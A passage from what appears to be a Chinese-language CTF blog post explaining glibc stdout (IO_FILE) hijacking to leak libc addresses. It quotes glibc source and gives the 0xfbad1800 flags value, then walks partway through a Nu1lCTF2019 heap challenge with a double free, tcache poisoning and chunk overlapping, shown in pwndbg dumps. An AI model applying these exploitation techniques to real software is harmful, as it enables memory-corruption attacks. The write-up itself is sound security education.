*/</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">     If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">     logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">     read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">     makes room for subsequent output.</span></span><br><span class="line"><span class="comment">     Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">     alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">      f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">    f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>
+
+<p>这里要保证<code>f-&gt;_flags &amp; _IO_NO_WRITES</code>为0,否则会进入<code>SET ERROR</code>分支</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>使下面条件成立</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<p>最好的办法就是将<code>#define _IO_CURRENTLY_PUTTING 0x800</code>置为1，当<code>stdout</code>从来没有输出过时，该标志位为0，因为程序绝大多数是要输出的，所以通常情况下该标志位就是1</p>
+<p>上面函数最重要的代码如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line"><span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">         f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>_IO_do_write</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In file: /glibc/glibc<span class="number">-2.27</span>/libio/fileops.c</span><br><span class="line">   <span class="number">428</span> </span><br><span class="line">   <span class="number">429</span> <span class="keyword">int</span></span><br><span class="line">   <span class="number">430</span> _IO_new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">   <span class="number">431</span> &#123;</span><br><span class="line">   <span class="number">432</span>   <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line"> ► <span class="number">433</span>       || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">   <span class="number">434</span> &#125;</span><br><span class="line">   <span class="number">435</span> libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>new_do_write</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们最终要执行<code>_IO_SYSWRITE</code>,所以这里要保证<code>_IO_IS_APPENDING</code>为1,或者<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><ul>
+<li><p>利用<code>unsorted bin</code>的在<code>tcache</code>或<code>fastbin</code>的<code>fd</code>上踩出<code>main_arena</code>的地址，然后部分覆盖修改<code>main_arena</code>的地址实现对<code>stdout</code>的地址进行爆破，从而劫持<code>stdout</code>以达到泄露的目的.</p>
+</li>
+<li><p>对于没有<code>tcache</code>的<code>glibc</code>版本，使用<code>fastbin attack</code>就好，因为<code>_IO_2_1_stdout_</code>上面就是<code>_IO_2_1_stderr_</code>， <code>stderr-&gt;__pad2</code>一般是指向<code>_IO_wide_data_2</code>的指针，而<code>_IO_wide_data_2</code>是在<code>libc</code>中的，所以我们可以用其来伪造<code>size</code></p>
+</li>
+</ul>
+<p>具体伪造size的情况如下的调试代码所示：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">14</span>gx <span class="number">0x7ffff7dd36f0</span></span><br><span class="line"><span class="number">0x7ffff7dd36f0</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">144</span>&gt;:    <span class="number">0xffffffffffffffff</span>    <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd3700</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">160</span>&gt;:    <span class="number">0x00007ffff7dd2760</span>    <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd3710</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">176</span>&gt;:    <span class="number">0x0000000000000000</span>    <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd3720</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">192</span>&gt;:    <span class="number">0x0000000000000000</span>    <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd3730</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">208</span>&gt;:    <span class="number">0x0000000000000000</span>    <span class="number">0x00007ffff7dcf2a0</span></span><br><span class="line"><span class="number">0x7ffff7dd3740</span> &lt;_IO_2_1_stdout<span class="number">_</span>&gt;:    <span class="number">0x00000000fbad2887</span>    <span class="number">0x00007ffff7dd37c3</span></span><br><span class="line"><span class="number">0x7ffff7dd3750</span> &lt;_IO_2_1_stdout<span class="number">_</span>+<span class="number">16</span>&gt;:    <span class="number">0x00007ffff7dd37c3</span>    <span class="number">0x00007ffff7dd37c3</span></span><br><span class="line">pwndbg&gt; x/<span class="number">14</span>gx <span class="number">0x7ffff7dd36f0</span>+<span class="number">5</span>-<span class="number">8</span></span><br><span class="line"><span class="number">0x7ffff7dd36ed</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">141</span>&gt;:    <span class="number">0xffffffffff00007f</span>    <span class="number">0x0000000000ffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd36fd</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">157</span>&gt;:    <span class="number">0xfff7dd2760000000</span>    <span class="number">0x000000000000007f</span></span><br><span class="line"><span class="number">0x7ffff7dd370d</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">173</span>&gt;:    <span class="number">0x0000000000000000</span>    <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd371d</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">189</span>&gt;:    <span class="number">0x0000000000000000</span>    <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd372d</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">205</span>&gt;:    <span class="number">0x0000000000000000</span>    <span class="number">0xfff7dcf2a0000000</span></span><br><span class="line"><span class="number">0x7ffff7dd373d</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">221</span>&gt;:    <span class="number">0x00fbad288700007f</span>    <span class="number">0xfff7dd37c3000000</span></span><br><span class="line"><span class="number">0x7ffff7dd374d</span> &lt;_IO_2_1_stdout<span class="number">_</span>+<span class="number">13</span>&gt;:    <span class="number">0xfff7dd37c300007f</span>    <span class="number">0xfff7dd37c300007f</span></span><br></pre></td></tr></table></figure>
+
+<p>以上内容参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">ctf-wiki</a>和<a href="https://www.secpulse.com/archives/111304.html" target="_blank" rel="noopener">安全脉搏</a></p>
+<p>而在实际的ctf比赛中我们通常会用以下方式构造<code>_flags</code>的值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"></span><br><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="Warmup-Nu1lctf2019"><a href="#Warmup-Nu1lctf2019" class="headerlink" title="Warmup(Nu1lctf2019)"></a>Warmup(Nu1lctf2019)</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul>
+<li>double free 攻击 tcache_entry</li>
+<li>unsorted bin 踩出 tcache</li>
+<li>修改 stdout</li>
+<li>劫持 hook</li>
+</ul>
+<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>在<code>delete</code>函数中,如果<code>qword_202080[v1]</code>不存在,并且<code>ptr</code>存在,则会<code>free</code>该<code>ptr</code>指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v1 = my_read();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( qword_202080[v1] )                          <span class="comment">//如果该条件不成立</span></span><br><span class="line">      ptr = (<span class="keyword">void</span> *)qword_202080[v1];</span><br><span class="line">    <span class="keyword">if</span> ( ptr )                                       <span class="comment">//且该条件成立</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      qword_202080[v1] = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"done!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"no such note!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而在<code>modify</code>函数中,我们可以对<code>ptr</code>赋值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">modify</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v1 = my_read();</span><br><span class="line">  ptr = (<span class="keyword">void</span> *)qword_202080[v1];    <span class="comment">//赋值</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> &amp;&amp; ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"content&gt;&gt;"</span>);</span><br><span class="line">    my_read1(ptr, <span class="number">64</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"no such note!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h4><ul>
+<li>首先通过添加然后<code>modify</code>构造如下的chunk结构</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">20</span>gx <span class="number">0x555555554000</span>+<span class="number">0x202060</span></span><br><span class="line"><span class="number">0x555555756060</span>:	<span class="number">0x0000555555757670</span>	<span class="number">0x0000000000000000</span>  /ptr </span><br><span class="line"><span class="number">0x555555756070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756080</span>:	<span class="number">0x0000555555757670</span>	<span class="number">0x00005555557576c0</span>  /chunk <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">0x555555756090</span>:	<span class="number">0x0000555555757710</span>	<span class="number">0x0000555555757760</span>  /chunk <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">0x5555557560a0</span>:	<span class="number">0x00005555557577b0</span>	<span class="number">0x0000000000000000</span>  /chunk <span class="number">4</span></span><br><span class="line"><span class="number">0x5555557560b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改<code>chunk0</code>使<code>ptr</code>指向<code>chunk0</code>并伪造一个<code>fake size</code>,然后<code>delete</code>不存在的<code>chunk</code>实现<code>double free</code>  </li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">2</span>]: <span class="number">0x555555757670</span> ◂— <span class="number">0x555555757670</span> /* <span class="string">'pvuUUU'</span> *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">0x410 [  1]: 0x555555757260 ◂— 0x0</span></span><br><span class="line"><span class="regexp">fastbins</span></span><br><span class="line"><span class="regexp">0x20: 0x0</span></span><br><span class="line"><span class="regexp">0x30: 0x0</span></span><br><span class="line"><span class="regexp">0x40: 0x0</span></span><br><span class="line"><span class="regexp">0x50: 0x0</span></span><br><span class="line"><span class="regexp">0x60: 0x0</span></span><br><span class="line"><span class="regexp">0x70: 0x0</span></span><br><span class="line"><span class="regexp">0x80: 0x0</span></span><br><span class="line"><span class="regexp">unsortedbin</span></span><br><span class="line"><span class="regexp">all: 0x0</span></span><br><span class="line"><span class="regexp">smallbins</span></span><br><span class="line"><span class="regexp">empty</span></span><br><span class="line"><span class="regexp">largebins</span></span><br><span class="line"><span class="regexp">empty</span></span><br><span class="line"><span class="regexp">pwndbg&gt; x /</span><span class="number">10</span>gx <span class="number">0x0000555555757670</span></span><br><span class="line"><span class="number">0x555555757670</span>:	<span class="number">0x0000555555757670</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757680</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757690</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x5555557576a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557576b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改<code>chunk0</code>的<code>fd</code>实现<code>chunk overlapping</code></li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">0</span>]: <span class="number">0x5555557576a0</span> ◂— ...    /<span class="regexp">/fake chunk</span></span><br><span class="line"><span class="regexp">0x410 [  1]: 0x555555757260 ◂— 0x0</span></span><br><span class="line"><span class="regexp">fastbins</span></span><br><span class="line"><span class="regexp">0x20: 0x0</span></span><br><span class="line"><span class="regexp">0x30: 0x0</span></span><br><span class="line"><span class="regexp">0x40: 0x0</span></span><br><span class="line"><span class="regexp">0x50: 0x0</span></span><br><span class="line"><span class="regexp">0x60: 0x0</span></span><br><span class="line"><span class="regexp">0x70: 0x0</span></span><br><span class="line"><span class="regexp">0x80: 0x0</span></span><br><span class="line"><span class="regexp">unsortedbin</span></span><br><span class="line"><span class="regexp">all: 0x0</span></span><br><span class="line"><span class="regexp">smallbins</span></span><br><span class="line"><span class="regexp">empty</span></span><br><span class="line"><span class="regexp">largebins</span></span><br><span class="line"><span class="regexp">empty</span></span><br><span class="line"><span class="regexp">pwndbg&gt; x /</span><span class="number">10</span>gx <span class="number">0x0000555555757670</span></span><br><span class="line"><span class="number">0x555555757670</span>:	<span class="number">0x0000555545454545</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757680</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757690</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x5555557576a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557576b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过<code>fake chunk</code>修改<code>chunk1</code>的大小为<code>unsortedbin</code>大小,然后多次<code>free</code>,填满<code>tchache</code>,成功获得<code>unsortedbin</code></li>
+</ul>
